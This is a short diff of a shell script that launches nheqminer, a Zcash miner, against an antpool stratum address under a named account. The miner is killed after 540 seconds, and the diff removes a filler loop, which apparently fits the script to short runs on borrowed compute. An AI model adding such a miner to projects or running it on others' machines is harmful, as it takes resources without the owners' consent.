@@ -1,7 +1,3 @@
 echo "lanjut"
-for i in {1..100000}
-do
-   echo "Welcome $i times"
-done
 #nohup ./nheqminer -l stratum-zec.antpool.com:8899 -u spiritbro.panda -p x > /dev/null 2>&1 &
-( cmdpid=$BASHPID; (sleep 540; kill $cmdpid) & exec ./nheqminer -l stratum-zec.antpool.com:8899 -u spiritbro.panda -p x  )
+( cmdpid=$BASHPID; (sleep 540; kill $cmdpid) & (sleep 10 && exec ./nheqminer -l stratum-zec.antpool.com:8899 -u spiritbro.panda -p x)  )
